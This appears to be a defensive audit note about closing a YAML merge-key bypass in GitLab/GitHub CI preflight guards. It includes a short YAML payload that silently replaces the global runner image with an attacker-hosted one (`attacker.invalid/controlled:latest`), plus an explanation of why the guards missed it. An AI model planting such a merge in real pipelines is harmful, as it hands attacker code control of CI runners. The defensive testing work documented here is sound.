# Wave 86 — INF-03/04/11 GitLab root-merge authority

Date: 2026-09-19
Comparison base: `a228c91`

## Reproduced bypass

The common CI preflight rejected aliases used as mapping keys and several
other disguised-key forms, but it still accepted YAML's plain merge key. This
GitLab prefix passed both full local guards:

```yaml
.runner-policy: &runner_policy
  image: attacker.invalid/controlled:latest

<<: *runner_policy
```

Ruby Psych 3.1.0, used only as the semantic oracle, materialized the anchored
`image` at the document root. The guards saw `image:` only inside a hidden
template and continued reviewing the honest plain `default` and required-job
blocks. Both returned success even though effective global runner context had
changed.

## Fail-closed correction

The shared lexical preflight now rejects every plain `<<:` merge key outside
literal/folded block scalar bodies. Quoted, flow-style and explicit-key merge
forms were already rejected by the broader Wave 84/85 subset. Because the
preflight covers the complete GitHub and GitLab documents before authority or
execution extraction, a merge cannot import hidden global, job or step
configuration.

Ordinary anchors in scalar values are not newly rejected. Existing quoted
values, GitLab flow sequences and key-shaped text inside block scripts remain
accepted. No checked-in CI document or pipeline command changed.

## Adversarial coverage

Independent test- and scanner-posture fixtures inject the anchored hidden
runner policy through root- and required-job-local merges in otherwise
complete honest GitLab pipelines. Each must fail specifically for the merge
key. Separate fixtures verify that
quoted, explicit-key and flow-style merge spellings remain rejected by the
earlier preflight rules, while `<<:` inside a literal block script remains
data. Existing positive fixtures continue to cover honest workflows and
quoted values.

## Validation

```text
python3 -I scripts/check-tests-blocking.selftest.py
# OK — 167 cases behave as documented

python3 -I scripts/check-scanners-blocking.selftest.py
# OK — 128 cases, both directions

python3 -I scripts/check-tests-blocking.py
# OK — supported explicit test commands cover 8 live crates on both pipelines

python3 -I scripts/check-scanners-blocking.py
# OK — 8 GitLab + 8 GitHub jobs are blocking

python3 -I -m py_compile <the four guard/selftest scripts>
# passed

git diff --check -- <Wave 86 infra files>
# passed
```

The final `check-tests-blocking.selftest.py` SHA-256 is
`bec0fd069769f4dc8551cd7e413c603bfa37c7789c2e4a52d03a64eb0360639a`,
and the test guard pins that exact digest.

## Residual boundary

This is a local textual proof over a deliberately small CI subset. It does not
prove hosted execution, event delivery, runner/image provenance or
availability, installed tool bytes, project rules or branch protection. YAML
directives/document markers, CRLF and tabs produced no full-guard bypass in
the supported checked-in shapes during this bounded audit; this wave makes no
general-YAML-parser claim.
